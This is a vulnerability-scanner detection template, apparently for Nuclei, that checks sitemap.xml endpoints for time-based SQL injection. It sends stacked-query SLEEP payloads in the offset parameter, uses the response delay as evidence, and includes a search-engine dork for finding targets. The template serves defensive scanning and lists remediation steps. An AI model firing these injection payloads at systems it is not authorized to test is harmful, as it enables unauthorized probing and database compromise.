id: sitemap-sql-injection

info:
  name: Sitemap - SQL 注入漏洞
  author: Aravind,j4vaovo
  severity: high
  description: |
    该模板用于检测 Sitemap - SQL 注入漏洞。该类漏洞通常源于接口将用户可控参数直接拼接进 SQL 语句，导致查询语义被篡改。模板会根据请求响应中的状态码、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  reference:
    - https://twitter.com/GodfatherOrwa/status/1647406811216072705?t=fbn0Eu34euKdrn4fL8UqfQ&s=19
  classification:
    cwe-id: CWE-89
  metadata:
    max-request: 2
    google-query: intext:"sitemap" filetype:txt, filetype:xml inurl:sitemap
  tags: time-based-sqli,misconfig,sitemap,sqli,vuln

http:
  - raw:
      - |
        @timeout: 15s
        POST /sitemap.xml?offset=1;SELECT%20IF((SLEEP(6)),1,2356)# HTTP/1.1
        Host: {{Hostname}}
      - |
        @timeout: 25s
        POST /sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356)# HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=6'
          - 'status_code_1 == 200'
          - 'contains(body_1, "sitemap>")'
        condition: and

      - type: dsl
        dsl:
          - 'duration_2>=16'
          - 'status_code_2 == 200'
          - 'contains(body_2, "sitemap>")'
        condition: and
